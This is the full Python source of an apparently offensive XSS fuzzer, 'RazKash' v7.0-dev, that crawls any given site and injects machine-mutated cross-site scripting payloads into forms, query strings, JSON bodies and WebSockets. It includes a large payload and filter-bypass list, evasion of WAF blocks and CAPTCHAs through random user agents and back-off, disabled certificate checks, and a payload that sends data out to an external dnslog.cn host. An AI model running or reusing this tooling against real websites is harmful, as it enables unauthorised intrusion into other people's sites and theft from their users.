#!/usr/bin/env python3
# =============================================================================
# RazKash 𝕏SS AI Fuzzer – (v7.0‑dev, 2025‑04‑21)
# Author : Haroon Ahmad Awan · CyberZeus (haroon@cyberzeus.pk)
# =============================================================================
#  • *Everything* from v4.3 ➜ v5.1 ➜ v6.0
"""
$ python3 razkash_v7.py -u https://modern‑app.tld --threads 40 --debug
"""
# ─────────────────────────────────────────────────────────────────────────────
import os, re, ssl, sys, json, time, random, string, argparse, warnings, logging, base64, threading, contextlib, xml.etree.ElementTree as ET
from pathlib import Path
from typing import List, Dict, Set, Any
from difflib import SequenceMatcher
from concurrent.futures import ThreadPoolExecutor
import urllib.parse, requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import torch
from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log

# ▶ optional deps
try:
    from playwright.sync_api import sync_playwright, Request as PWReq, WebSocket as PWWS, Response as PWResp
except ImportError:
    sync_playwright = None
try:
    import websocket
except ImportError:
    websocket = None

# ─── CONFIG ─────────────────────────────────────────────────────────────────
VER                = "7.0‑dev"
MODEL              = "microsoft/codebert-base"
DNSLOG_DOMAIN      = "q68w9p.dnslog.cn"
LOGFILE            = Path("razkash_findings.md")
TOP_K              = 7
DEF_THREADS        = 14
MAX_STATIC_PAGES   = 250
DYN_OBS_MS         = 20000
RESCAN_MS          = 600
MAX_DYN_ROUNDS     = 80
HTTP_TIMEOUT       = 12
VERIFY_TIMEOUT     = 9000
HEADLESS_WAIT      = 3500

# ─── CLI ────────────────────────────────────────────────────────────────────
ap = argparse.ArgumentParser(description="Ω‑Ultra‑∞ AI XSS Fuzzer")
ap.add_argument("-u","--url",help="Target root URL")
ap.add_argument("--autotest",action="store_true",help="Run built‑in playgrounds")
ap.add_argument("--threads",type=int,default=DEF_THREADS)
ap.add_argument("--max-pages",type=int,default=MAX_STATIC_PAGES)
ap.add_argument("--debug",action="store_true")
args,_ = ap.parse_known_args()
DEBUG = args.debug

logging.basicConfig(level=logging.DEBUG if DEBUG else logging.INFO,
                    format="%(asctime)s %(levelname)s: %(message)s" if DEBUG else "%(message)s")
warnings.filterwarnings("ignore")
hf_log.set_verbosity_error()
os.environ["TRANSFORMERS_NO_TQDM"]="1"
ssl._create_default_https_context = ssl._create_unverified_context

# ─── UTILS ────────────────────────────────────────────────────────────────
def dbg(m:str):             # debug helper
    if DEBUG: logging.debug(m)
randstr = lambda n=12: ''.join(random.choices(string.ascii_letters+string.digits,k=n))
def jitter(a,b): time.sleep(random.uniform(a,b))
def smart_url(b:str)->str:
    if b.startswith(("http://","https://")): return b
    for s in ("https://","http://"):
        with contextlib.suppress(Exception):
            if requests.head(s+b,timeout=5,allow_redirects=True,verify=False).status_code<500: return s+b
    return "http://"+b
def random_headers()->Dict[str,str]:
    ua=UserAgent()
    return {"User-Agent":ua.random,"Accept":"*/*","Accept-Language":"en-US,en;q=0.9",
            "Accept-Encoding":"gzip, deflate","Connection":"keep-alive","DNT":random.choice(["1","0"])}

# ─── AI INIT ───────────────────────────────────────────────────────────────
tok = AutoTokenizer.from_pretrained(MODEL)
mdl = AutoModelForMaskedLM.from_pretrained(MODEL).eval()
MASK_T, MASK_ID = tok.mask_token, tok.mask_token_id
def ai_mutate(s:str)->str:
    while "MASK" in s:
        ids=tok(s.replace("MASK",MASK_T,1),return_tensors="pt").input_ids
        with torch.no_grad(): l=mdl(input_ids=ids).logits
        pos=(ids==MASK_ID).nonzero(as_tuple=True)[1][0]
        w=tok.decode(random.choice(l[0,pos].topk(TOP_K).indices.tolist())).strip() or "alert(1)"
        s=s.replace("MASK",w,1)
    return s
def polymorph(s:str)->str:
    t=random.choice(["hex","uni","url","b64","none"])
    if t=="hex": return ''.join(f"\\x{ord(c):02x}" for c in s)
    if t=="uni": return ''.join(f"\\u{ord(c):04x}" for c in s)
    if t=="url": return urllib.parse.quote(s)
    if t=="b64": return base64.b64encode(s.encode()).decode()
    return s
def legit_wrap(s:str)->str:
    return random.choice([
        "<div hidden>PAYLOAD</div>",
        "<span style=display:none>PAYLOAD</span>",
        "<p data-i=PAYLOAD></p>",
        "<video srcdoc='<script>PAYLOAD</script>'></video>",
        "<template id=tpl>PAYLOAD</template><script>document.body.append(tpl.content)</script>"
    ]).replace("PAYLOAD",s)
def reflected(mk:str,html:str)->bool:
    return mk.lower() in html.lower() or SequenceMatcher(None,mk.lower(),html.lower()).quick_ratio()>0.8

# ─── PAYLOAD LIST (union) ─────────────────────────────────────────────────
tags=["script","img","iframe","svg","video","object","math","audio","details","marquee"]
evs=["onerror","onload","onclick","onmouseover","onfocus","onmouseenter","ontoggle","oncanplay","onpointerdown"]
prot=["javascript:alert(1)","data:text/html,<script>alert(1)</script>","vbscript:msgbox('XSS')"]
PAY=[]
for t in tags:
    for e in evs: PAY.append(f"<{t} {e}=\"MASK\"></{t}>")
    if t in ("img","iframe","object"):
        PAY.extend(f"<{t} src=\"{p.replace('MASK','MASK')}\"></{t}>"for p in prot)
PAY+=[
 "<script>MASK</script>","<body onload=MASK>","<div style=background:url(MASK)></div>",
 "<input value=MASK>","<textarea>MASK</textarea>","<button onclick=MASK>x</button>",
 "<div style=\"width:expression(MASK)\"></div>","<svg><script>MASK</script></svg>",
 "<img src=\"data:image/png;base64,MASK\">","<script src=\"/jsonp?cb=MASK\"></script>",
 "<template><script>MASK</script></template>",
 '<script type=module>import("javascript:MASK")</script>',
 'importScripts("data:text/javascript,MASK")',
 '<template><shadow-root></shadow-root><script>MASK</script></template>',
 '<script>new MutationObserver(_=>MASK).observe(document.body,{childList:true})</script>',
 '<style>@supports(display:grid){@import "javascript:MASK";}</style>',
 '<iframe src="data:text/html;base64,MASK"></iframe>',
 '<script>WebAssembly.instantiateStreaming(fetch("data:application/wasm;base64,MASK"))</script>',
 '<img src="javascript:MASK%00.gif">','<plaintext>\u202EMASK</plaintext>',
 '<svg><animate attributeName=href to="javascript:MASK"/></svg>'
]
if DNSLOG_DOMAIN: PAY.append(f"<img src onerror=fetch('http://{DNSLOG_DOMAIN}/?p='+btoa(MASK))>")
FILTER=["<sCrIpT>PAYLOAD</sCrIpT>","<!-->PAYLOAD<!-->","<svg onload=PAYLOAD>",
        "<script>setTimeout(()=>{{PAYLOAD}},0)</script>","<object data=\"javascript:PAYLOAD\"></object>",
        "<meta http-equiv=refresh content=\"0;url=javascript:PAYLOAD\">"]

# ─── VERIFIER (Playwright, closed shadow‑root hook) ────────────────────────
JSFLAG="""
window._xss_triggered=false;function _f(){window._xss_triggered=true;}
['innerHTML','outerHTML','insertAdjacentHTML'].forEach(p=>{const d=Object.getOwnPropertyDescriptor(Element.prototype,p)||{};
 if(d.set){Object.defineProperty(Element.prototype,p,{set(v){_f();d.set.call(this,v)},configurable:true})}});
const _eval=window.eval;window.eval=function(...a){_f();return _eval(...a)}
const _Fn=Function;window.Function=function(...a){_f();return new _Fn(...a)}
const old=Element.prototype.attachShadow;Element.prototype.attachShadow=function(o){o=o||{};o.mode='open';return old.call(this,o)}
if(window.trustedTypes&&trustedTypes.createPolicy){trustedTypes.createPolicy('x',{createHTML:s=>{_f();return s}})}
"""
def verify(url:str,m:str,data:Any,is_json=False)->bool:
    if not sync_playwright: return False
    try:
        with sync_playwright() as p:
            br=p.chromium.launch(headless=True,args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
            ctx=br.new_context(ignore_https_errors=True,user_agent=UserAgent().random); ctx.add_init_script(JSFLAG)
            page=ctx.new_page(); page.on("dialog",lambda d:(d.dismiss(),page.evaluate("_f()")))
            if m=="GET":
                page.goto(f"{url}?{urllib.parse.urlencode(data)}",timeout=VERIFY_TIMEOUT,wait_until="domcontentloaded")
            else:
                h={"Content-Type":"application/json"} if is_json else {'Content-Type':'application/x-www-form-urlencoded'}
                body=json.dumps(data) if is_json else urllib.parse.urlencode(data)
                page.goto(url,timeout=VERIFY_TIMEOUT,wait_until="domcontentloaded")
                page.evaluate("(u,h,b)=>fetch(u,{method:'POST',headers:h,body:b,credentials:'include'})",url,h,body)
            page.wait_for_timeout(HEADLESS_WAIT)
            res=page.evaluate("window._xss_triggered"); ctx.close(); br.close()
            return bool(res)
    except Exception as e:
        dbg(f"[verify] {e}"); return False

# ─── LOG (dedup, thread‑safe) ─────────────────────────────────────────────
if not LOGFILE.exists(): LOGFILE.write_text(f"# RazKash Findings v{VER}\n\n","utf-8")
_hits:Set[str]=set(); lock=ThreadPoolExecutor(max_workers=1)
def log_hit(u,m,p):
    ent=f"- **XSS** {m} `{u}` payload=`{p[:90]}`\n"
    if ent in _hits: return
    _hits.add(ent); lock.submit(lambda: LOGFILE.write_text(LOGFILE.read_text('utf-8')+ent,'utf-8'))
    logging.info(ent.strip())

# ─── DISCOVERY HELPERS (sitemap / bundle / json)────────────────────────────
JS_URL_RE=re.compile(r"""(['"])(/[^'"]+\.(?:php|asp|jsp|json|api|graphql|cgi))\1""",re.I)
SMAP_RE  =re.compile(r"""(?:fetch|axios\.\w+|xhr\.open)\([^'"]*['"](/[^'"]+)['"]""")
def mine_js(url,host):
    urls=[]
    with contextlib.suppress(Exception):
        t=requests.get(url,headers=random_headers(),timeout=8,verify=False).text
        urls+=JS_URL_RE.findall(t)
        urls+=SMAP_RE.findall(t)
        if "sourceMappingURL" in t and url.endswith(".js"):
            sm=url.rsplit("/",1)[0]+"/"+t.split("sourceMappingURL=")[-1].split("\n")[0].strip()
            urls+=mine_js(sm,host)
    return [urllib.parse.urljoin(url,u[1] if isinstance(u,tuple) else u) for u in urls
            if urllib.parse.urlparse(urllib.parse.urljoin(url,u[1] if isinstance(u,tuple) else u)).netloc.lower()==host]

def misc_assets(root):
    out=[]
    base=urllib.parse.urlparse(root)._replace(path="",params="",query="",fragment="").geturl()
    def fetch(p):
        try:
            r=requests.get(base+p,headers=random_headers(),timeout=6,verify=False); 
            return r.text if r.ok else ""
        except:return""
    rob=fetch("/robots.txt")
    for l in rob.splitlines():
        if l.lower().startswith("sitemap:"): out.append(l.split(":",1)[1].strip())
    for sm in out[:]:
        with contextlib.suppress(Exception):
            xml=requests.get(sm,headers=random_headers(),timeout=6,verify=False).text
            out+= [loc.text.strip() for loc in ET.fromstring(xml).iter("{*}loc")]
    for p in ("/manifest.json","/ngsw.json"):
        d=fetch(p)
        with contextlib.suppress(Exception):
            j=json.loads(d); u=j.get("assets",[])+j.get("files",[])
            out+= [base+v if v.startswith("/") else v for v in u]
    return list(set(out))

# ─── STATIC CRAWLER ────────────────────────────────────────────────────────
JS_CALL_RE=re.compile(r"""(?:fetch\(|axios\.\w+\(|XMLHttpRequest\(.+?open\()\s*["']([^"']+)""",re.I)
def crawl_static(root,cap):
    vis,queue,targets=set(),[root]+misc_assets(root),[]
    host=urllib.parse.urlparse(root).netloc.lower()
    while queue and len(vis)<cap:
        u=queue.pop(0)
        if u in vis: continue
        vis.add(u)
        try:r=requests.get(u,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
        except Exception as e: dbg(f"[crawl] {e}"); continue
        ctype=r.headers.get("Content-Type","")
        if "javascript" in ctype:
            queue+=mine_js(u,host); continue
        if "text/html" not in ctype: continue
        soup=BeautifulSoup(r.text,"html.parser")
        for s in soup("script",src=True):
            src=urllib.parse.urljoin(u,s["src"])
            if urllib.parse.urlparse(src).netloc.lower()==host: queue.append(src)
        for a in soup("a",href=True):
            nxt=urllib.parse.urljoin(u,a["href"]); p=urllib.parse.urlparse(nxt)
            if p.netloc.lower()!=host: continue
            if nxt not in vis: queue.append(nxt)
            if p.query:
                targets.append({"url":p._replace(query="").geturl(),"method":"GET",
                                "params":list(urllib.parse.parse_qs(p.query).keys())})
        for fm in soup("form"):
            act=urllib.parse.urljoin(u,fm.get("action") or u)
            if urllib.parse.urlparse(act).netloc.lower()!=host: continue
            meth=fm.get("method","get").upper()
            inp=[i.get("name") for i in fm("input",{"name":True})]
            if inp: targets.append({"url":act,"method":meth,"params":inp})
        for m in JS_CALL_RE.findall(r.text): queue.append(urllib.parse.urljoin(u,m))
        for m in JS_URL_RE.findall(r.text): queue.append(urllib.parse.urljoin(u,m[1]))
        jitter(0.3,1.0)
    return targets

# ─── JSON KEY HELPERS ──────────────────────────────────────────────────────
def deep_keys(o,b=""):
    if isinstance(o,dict):
        k=[]
        for x,v in o.items():
            p=f"{b}.{x}" if b else x
            k+=deep_keys(v,p) if isinstance(v,(dict,list)) else [p]
        return k
    if isinstance(o,list):
        k=[]
        for i,v in enumerate(o):
            p=f"{b}[{i}]"; k+=deep_keys(v,p) if isinstance(v,(dict,list)) else [p]
        return k
    return []
def set_deep(o,p,val):
    parts=re.split(r'\.|\[|\]',p); cur=o
    for seg in parts[:-1]:
        if not seg or seg.isdigit(): continue
        cur=cur.setdefault(seg,{})
    leaf=parts[-1]
    if leaf and not leaf.isdigit(): cur[leaf]=val

# ─── DYNAMIC CRAWLER (SPA + WS + SW) ───────────────────────────────────────
def crawl_dynamic(root):
    if not sync_playwright: return []
    host=urllib.parse.urlparse(root).netloc.lower()
    seen=set(); found=[]
    try:
        with sync_playwright() as p:
            br=p.chromium.launch(headless=True,args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
            ctx=br.new_context(ignore_https_errors=True,user_agent=UserAgent().random,service_workers="allow")
            page=ctx.new_page()
            ctx.add_init_script("""
                ['pushState','replaceState'].forEach(fn=>{const o=history[fn];history[fn]=function(){o.apply(this,arguments);window.dispatchEvent(new Event('nav'))}});
                window.addEventListener('hashchange',()=>window.dispatchEvent(new Event('nav')));
                new MutationObserver(()=>window.dispatchEvent(new Event('nav'))).observe(document,{subtree:true,childList:true});
            """)
            def req_hook(r:PWReq):
                u=r.url
                if urllib.parse.urlparse(u).netloc.lower()!=host or u in seen: return
                seen.add(u); meth=r.method
                hdr=r.headers.get("content-type","")
                is_json="json" in hdr or "graphql" in hdr
                tpl=None; keys=[]
                if is_json and r.post_data:
                    with contextlib.suppress(Exception):
                        tpl=json.loads(r.post_data)
                        if isinstance(tpl,dict) and "variables" in tpl: tpl=tpl["variables"]
                        keys=deep_keys(tpl)
                qs=list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query).keys())
                params=keys or qs or ["data"]
                found.append({"url":u.split("?",1)[0],"method":meth if meth in{"POST","PUT"} else "GET",
                              "params":params,"json":bool(keys),"template":tpl})
            page.on("request",req_hook)
            def resp_hook(r:PWResp):
                if r.request.resource_type not in ("xhr","fetch"): return
                if urllib.parse.urlparse(r.url).netloc.lower()!=host: return
                with contextlib.suppress(Exception):
                    t=r.text()
                    for m in JS_URL_RE.findall(t)+SMAP_RE.findall(t):
                        u=urllib.parse.urljoin(r.url,m[1] if isinstance(m,tuple) else m)
                        if u not in seen:
                            seen.add(u); found.append({"url":u,"method":"GET","params":["data"]})
            page.on("response",resp_hook)
            if websocket:
                page.on("websocket",lambda ws: ws.on("framereceived",
                          lambda ev: ws_frame(ws.url,ev,found)))
            def ws_frame(u,ev,store):
                with contextlib.suppress(Exception):
                    d=json.loads(ev["payload"]); k=deep_keys(d)
                    if k: store.append({"url":u,"method":"WS","params":k,"json":True,"template":d})
            def dom_scrape():
                r=page.evaluate("""(()=>{return[...document.forms].map(f=>({a:f.action||location.href,m:(f.method||'get').toUpperCase(),p:[...f.querySelectorAll('input[name]')].map(i=>i.name)}))})()""")
                for f in r:
                    if urllib.parse.urlparse(f["a"]).netloc.lower()!=host or not f["p"]: continue
                    found.append({"url":f["a"],"method":f["m"],"params":f["p"]})
            page.goto(root,timeout=VERIFY_TIMEOUT,wait_until="networkidle")
            st=time.time()*1000; rd=0
            while (time.time()*1000-st)<DYN_OBS_MS and rd<MAX_DYN_ROUNDS:
                try: page.wait_for_event("nav",timeout=RESCAN_MS)
                except: pass
                dom_scrape(); rd+=1
            ctx.close(); br.close()
    except Exception as e: dbg(f"[dyn] {e}")
    return found

# ─── WEBSOCKET FUZZER ──────────────────────────────────────────────────────
def fuzz_ws(t):
    if not websocket: return
    url,params,template=t["url"],t["params"],t.get("template") or {}
    mk=randstr(); body=json.loads(json.dumps(template)) if template else {}
    (set_deep(body,random.choice(params),f"<img src onerror=alert('{mk}')>") if body
     else body.update({random.choice(params):f"<svg/onload=alert('{mk}')>"}))
    pay=json.dumps(body); hit=False
    def on_msg(_,m): nonlocal hit; hit|=(mk in m)
    try:
        ws=websocket.WebSocketApp(url,on_message=on_msg)
        th=threading.Thread(target=ws.run_forever,kwargs={"sslopt":{"cert_reqs":ssl.CERT_NONE}})
        th.daemon=True; th.start(); time.sleep(1); ws.send(pay); time.sleep(3); ws.close()
        if hit: log_hit(url,"WS",pay)
    except Exception as e: dbg(f"[ws] {e}")

# ─── HTTP FUZZER ───────────────────────────────────────────────────────────
def fuzz_http(t):
    url,method,params=t["url"],t["method"]; is_json=t.get("json",False);tpl=t.get("template")
    mk=randstr()
    try:
        if is_json and tpl:
            body=json.loads(json.dumps(tpl)); set_deep(body,random.choice(params),mk)
            rst=requests.post(url,headers={"Content-Type":"application/json"},data=json.dumps(body),
                              timeout=HTTP_TIMEOUT,verify=False)
        else:
            data={p:mk for p in params}
            rst=(requests.get if method=="GET" else requests.post)(url,params=data if method=="GET" else None,
                   data=data if method=="POST" else None,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
        if rst.status_code!=200 or not reflected(mk,rst.text): return
    except Exception as e: dbg(f"[probe] {e}"); return
    for sk in random.sample(PAY,k=min(len(PAY),24)):
        base=ai_mutate(sk); vars={base,polymorph(base),legit_wrap(base)}
        for fw in random.sample(FILTER,k=2): vars.add(fw.replace("PAYLOAD",base))
        if DNSLOG_DOMAIN: vars.add(f"<img src onerror=fetch('http://{DNSLOG_DOMAIN}/?p='+btoa('{urllib.parse.quote(base)}'))>")
        for pay in vars:
            try:
                if is_json and tpl:
                    body=json.loads(json.dumps(tpl))
                    for p in params: set_deep(body,p,pay)
                    r=requests.post(url,headers={"Content-Type":"application/json"},
                                    data=json.dumps(body),timeout=HTTP_TIMEOUT,verify=False)
                else:
                    dat={p:pay for p in params}
                    r=(requests.get if method=="GET" else requests.post)(url,
                         params=dat if method=="GET" else None,data=dat if method=="POST" else None,
                         headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
                if r.status_code in {403,429,503} or any(w in r.text.lower() for w in ("captcha","access denied","blocked")):
                    dbg(f"[WAF] {url}"); jitter(25,55); return
                if reflected(pay,r.text) or verify(url,method,dat if not is_json else body,is_json):
                    log_hit(url,method,pay); return
            except Exception as e: dbg(f"[err] {e}")
            jitter(1.0,2.4)

# ─── MAIN ─────────────────────────────────────────────────────────────────
AUTOTEST=["xss-game.appspot.com","testphp.vulnweb.com","portswigger.net/web-security/xss"]
def main():
    roots=[smart_url(h) for h in AUTOTEST] if args.autotest else [args.url] if args.url else []
    if not roots: ap.print_help(); sys.exit(1)
    logging.info(f"\n┌─ RazKash AI XSS v{VER}")
    for r in roots:
        root=smart_url(r.rstrip("/")); logging.info(f"├─▶ {root}")
        st=crawl_static(root,args.max_pages); dy=crawl_dynamic(root); targets=st+dy
        logging.info(f"│   {len(targets)} endpoints")
        ws=[t for t in targets if t["method"]=="WS"]; htt=[t for t in targets if t["method"]!="WS"]
        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            pool.map(fuzz_http,htt); pool.map(fuzz_ws,ws)
        logging.info("│   ✓ done\n")
    logging.info(f"└─ Results → {LOGFILE.resolve()}\n")

if __name__=="__main__": main()
